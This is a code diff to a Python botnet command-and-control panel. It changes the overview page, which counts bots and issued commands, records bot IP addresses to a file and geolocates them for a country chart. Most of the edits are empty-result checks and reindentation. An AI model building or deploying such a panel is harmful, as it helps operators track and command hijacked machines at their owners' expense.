@@ -313,8 +313,9 @@ class CNC(object):
 			pass
 
 		SaveLog("REQUEST : 200 [ Ok ] | Overview.html")
+		
 		bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
-
+		
 		ALL_BOTS = bot_list
 		output = ""
 		counter = 0
@@ -323,9 +324,13 @@ class CNC(object):
 		offline = 0
 		lst_conn = ""
 		
+		
 		all_cmds = query_DB('SELECT * FROM commands ORDER BY date DESC')
-		for cmd in all_cmds :
-			commands += 1
+		if not all_cmds:
+			pass
+		else:
+			for cmd in all_cmds :
+				commands += 1
 		
 		if not bot_list :
 			loc = "none"
@@ -333,51 +338,56 @@ class CNC(object):
 			chart.run(loc,cc)
 			lst_conn = "-"
 
-		for bot in bot_list:
-			counter += 1
-			ip = bot[2]
-			
-			if counter == 1:
-				lst_conn = str(time.ctime(bot[1]))
-			
-			out_file = open("TempDir/BotIps.txt","a")
-			out_file.write("%s\n" % ip)
-			out_file.close()
 
-			if time.time() - 30 < bot[1]:
-				online += 1
+		else:
+			for bot in bot_list:
+				counter += 1
+				ip = bot[2]
+				
+				if counter == 1:
+					lst_conn = str(time.ctime(bot[1]))
+				
+				out_file = open("TempDir/BotIps.txt","a")
+				out_file.write("%s\n" % ip)
+				out_file.close()
 
-			if '192.168' in ip or '127.0' in ip:
-				loc = "Italy"
-				cc = "it"
-				cc = cc.lower()
-				chart.run(loc,cc)
-			else:
-				#check ip location
-				url = ('http://freegeoip.net/json/%s' %ip)
-				try:
-					with closing(urlopen(url)) as response:
-						 location = json.loads(response.read())
-						 loc = location['country_name']
-						 cc = location['country_code']	
-						 cc = cc.lower()
-						 chart.run(loc,cc)
-				except:
-					print("Location could not be determined automatically")
+				if time.time() - 30 < bot[1]:
+					online += 1
 
+				if '192.168' in ip or '127.0' in ip:
+					loc = "Italy"
+					cc = "it"
+					cc = cc.lower()
+					chart.run(loc,cc)
+				else:
+					#check ip location
+					url = ('http://freegeoip.net/json/%s' %ip)
+					try:
+						with closing(urlopen(url)) as response:
+							 location = json.loads(response.read())
+							 loc = location['country_name']
+							 cc = location['country_code']	
+							 cc = cc.lower()
+							 chart.run(loc,cc)
+					except:
+						print("Location could not be determined automatically")
+		
 		thread = Thread(target = worldgen)
 		thread.start()	
 		thread.join()
+		
 
 		with open("html/Overview.html", "r") as f:
 
 				html = f.read()
-				
-				offline = counter - online
-				
+				print html
+				if int(counter) == 0:
+					offline = 0
+				else:
+					offline = int(counter) - int(online)
 				
 					
-				html = html.replace("{{bot_table}}", output)
+				html = html.replace("{{output}}", str(output))
 				html = html.replace("{{bots}}", str(counter))
 				html = html.replace("{{bats}}", str(online))
 				html = html.replace("{{offs}}", str(offline))
